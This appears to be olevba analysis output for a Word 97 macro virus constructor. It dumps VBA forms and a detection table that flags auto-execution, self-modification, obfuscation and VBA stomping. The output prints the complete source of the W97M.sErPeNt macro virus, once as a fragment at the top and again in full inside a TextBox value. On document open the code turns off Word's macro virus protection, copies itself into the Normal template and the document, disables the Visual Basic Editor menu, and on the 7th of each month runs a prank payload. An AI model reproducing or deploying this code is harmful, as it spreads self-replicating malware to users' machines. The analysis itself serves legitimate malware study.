MsgBox x & dsa & asd & dfg & dsa & dfg & dfg & dsa & "---> Kad sve izgleda da umire ono se ustvari radja! <---" & dsa & dfg & asd & dfg & dfg & h & asd & dfg & x, vbExclamation, asd & " BIHnet.ORG 4nD EB Vir Labs 43v3r!!! " & asd
Application.WindowState = wdWindowStateNormal
'===={ ideja za D-Cross payload: e[ax] }===
Application.Move 150, 150
Application.Caption = "...hmmm, strange!"
For c = 1 To 300
Application.Move c, c
Application.Move -c, -c
Next c
'===={ kraj k�da za D-Cross payload }======
End If
With CommandBars: .Item("Macro").Controls("Visual Basic Editor").Enabled = False: End With: ActiveDocument.Save
'W97M.sErPeNt bY e[ax]
'D-Cross payload bY e[ax]
'Greetz: k04x, rudeboy, t[r]ax, E-Man, BIGFOOOT, SnakeLord
'Vr4g, h4dija, slash ...te ostalim pri BIHnet.org
'10x to: [moebius], KnowDeath, Jackie 2Fl0wer, Psyclone X, Mist
'mort-, Nala, LifeWire, GygaByte, ^Coke, Fluvian
'...and to VicodinES (Once again God Bless tha Poppy!)
End Sub

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/w97m_serpent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Terminal
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/w97m_serpent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:: Klik mi ::X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/w97m_serpent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/autorforma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/autorforma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/autorforma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/autorforma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/autorforma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame2'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame3'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame6'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'op1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'op2'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'op3'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'normal'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'napredna'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'agres'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
ERROR: Unsupported stored type in user form: 32768
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame7'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame8'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame9'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame4'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'wordstuph'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image2'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ProgressBar1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'pro'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'gret'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'autor'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'mvginfo'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'kont'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'izlaz'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'start'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'sec'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'min'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'sati'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'dani'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'tulzbris'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i49'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'insertbris'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i49'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'brisvemen'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i49'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'noveopcije'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i53'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'zaselec'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i69'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'printbes'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i69'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'selec'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i69'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'odmahclose'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i69'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i29'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'rcj'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i29'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/gretforma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Ovom prilikom zelim pozdraviti cijeli Bih Underground. Te posebno pozdravljam slijedece ljude:                                                                                                                                                                                                   k04x, rudeboy, Tra[x], E-man, Arp4man,    SnakeLord, BIGFOOOT, te ostalu raju iz BIHnet.ORG koje nisam spomenuo.                                                         Special greetz to:                                                VicodinES  - gdje god da si, ti si najbolji koder danasnjice.                                                             10x  to: Knowdeath, Jackie tw0flower         Greetz to: [moebius], mort, NALA, C - Yoda,                     LifeWire, GigaByte, etc. ... and also greetz goes to:  LineZer0, CodeBreakers, Metaphase, 29a (tha best) and so on. Best viral year to all ppl on Undernet. Thnx once again for ur help...      '
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/gretforma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/kontakti'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/kontakti/i05'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmurl'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/kontakti/i05'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/kontakti/i05'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'cm1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/userexit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/userexit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/userexit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/w97m_serpent'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/w97m_serpent'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Private Sub Document_Open(): Dim KIOXCFG, SDFHITD, GHJIDFR, LKJWERT: Set LKJWERT = ActiveDocument.VBProject.VBComponents(1).CodeModule: Const nula = 2 * 0\r\nWith Options: .VirusProtection = nula: End With\r\nSet KIOXCFG = ThisDocument.VBProject.VBComponents(1).CodeModule\r\nSet SDFHITD = NormalTemplate.VBProject.VBComponents(1).CodeModule\r\nGHJIDFR = KIOXCFG.lines(1, KIOXCFG.countoflines)\r\nIf SDFHITD.countoflines = KIOXCFG.countoflines Then\r\nMsgBox "Error245! MSWord will try to fix the problem.", vbCritical, "MSWord - error"\r\nEnd If\r\nDim QOINMV As New DataObject: QOINMV.SetText GHJIDFR\r\nWith SDFHITD: .deletelines 1, SDFHITD.countoflines: .insertlines 1, QOINMV.GetText\r\nEnd With: With LKJWERT: .deletelines 1, LKJWERT.countoflines: .insertlines 1, QOINMV.GetText\r\nEnd With\r\nIf Day(Now()) = 7 Then\r\nDim asd As String\r\nFor l = 1 To 4\r\nasd = Chr(Rnd * 34 + 123) & ChrW(Rnd * 100 + 23)\r\nasd = asd & Chr(Rnd * 200 - 10): dsa = asd & Hex(234 * Rnd) & Chr(Rnd * 5 + 55)\r\ndfg = dsa & Hex(54) & asd & dsa: h = Asc(Chr(Rnd * 123)): x = asd & dfg & dsa & h & x\r\nNext l\r\nMsgBox x & dsa & asd & dfg & dsa & dfg & dfg & dsa & "---> Kad sve izgleda da umire ono se ustvari radja! <---" & dsa & dfg & asd & dfg & dfg & h & asd & dfg & x, vbExclamation, asd & " BIHnet.ORG 4nD EB Vir Labs 43v3r!!! " & asd\r\nApplication.WindowState = wdWindowStateNormal\r\n\'===={ ideja za D-Cross payload: e[ax] }===\r\nApplication.Move 150, 150\r\nApplication.Caption = "...hmmm, strange!"\r\nFor c = 1 To 300\r\nApplication.Move c, c\r\nApplication.Move -c, -c\r\nNext c\r\n\'===={ kraj k\xf4da za D-Cross payload }======\r\nEnd If\r\nWith CommandBars: .Item("Macro").Controls("Visual Basic Editor").Enabled = False: End With: ActiveDocument.Save\r\n\'W97M.sErPeNt bY e[ax]\r\n\'D-Cross payload bY e[ax]\r\n\'Greetz: k04x, rudeboy, t[r]ax, E-Man, BIGFOOOT, SnakeLord\r\n\'Vr4g, h4dija, slash ...te ostalim pri BIHnet.org\r\n\'10x to: [moebius], KnowDeath, Jackie 2Fl0wer, Psyclone X, Mist\r\n\'mort-, Nala, LifeWire, GygaByte, ^Coke, Fluvian\r\n\'...and to VicodinES (Once again God Bless tha Poppy!)\r\nEnd Sub\r\n'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/w97m_serpent'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |cm1_click           |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |dani_Change         |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|ChrW                |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |IEXPLORE.EXE        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

